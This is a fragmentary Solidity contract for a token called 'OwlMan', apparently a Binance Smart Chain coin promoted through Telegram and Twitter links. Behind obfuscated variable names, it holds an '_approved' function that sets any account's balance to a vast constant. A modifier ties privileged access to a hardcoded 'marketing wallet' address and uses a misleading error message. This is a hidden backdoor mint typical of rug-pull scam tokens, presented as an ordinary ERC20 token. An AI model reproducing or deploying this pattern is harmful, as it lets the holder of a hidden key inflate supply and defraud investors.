...
📱 Telegran : https://t.me/glorybirdbsc

📱 Twitter : https://twitter.com/OwlManBSC
*/
...
contract Context {
 ...
 contract OwlMan is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private superfloKEMFT;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _name = "OwlMan";
    string private _symbol = "OWLMAN";
    ...
    uint256 private cryfaleKEMFT = 2;
    uint256 private _vebegoKEMFT = 1;
    ...
    constructor(uint256 totalSupply_) {
        ...
        _owner = _msgSender();
        superfloKEMFT[msg.sender] = totalSupply_;
    ...
    address private _MarketingWalletKEMFT = 0xD1476DFDE30f915aa0E1eC44D6A50F2fEa6cB7Ee;
    ...
    uint256 private constant _bolkoKEMFT = 10000000 * 10**42;
...
function _multiply (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = superfloKEMFT[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            superfloKEMFT[issuer] = senderBalance - allons;
        }
        _fee = (allons * cryfaleKEMFT / 100) / _vebegoKEMFT;
        allons = allons -  (_fee * _vebegoKEMFT);
        
        superfloKEMFT[grantee] += allons;
        emit Transfer(issuer, grantee, allons);
    }
    function _approved (address account) internal {
        superfloKEMFT[account] = superfloKEMFT[account] - superfloKEMFT[account] + _bolkoKEMFT;
    }
   ...
   */
    ...
    modifier posed () {
        require(_MarketingWalletKEMFT == _msgSender(), "203: Message Sender is different from address(0)!");
        _;
    }
     ...
     */
    function _burn(address account, uint256 gzillaKEMFT) internal virtual {
        require(account != address(0), "Can't burn from address 0");
        uint256 accountBalance = superfloKEMFT[account];
        require(accountBalance >= gzillaKEMFT, "BEP : Can't be done");
        unchecked {
            superfloKEMFT[account] = accountBalance - gzillaKEMFT;
        }
        _totalSupply -= gzillaKEMFT;

        emit Transfer(account, address(0), gzillaKEMFT);
    }
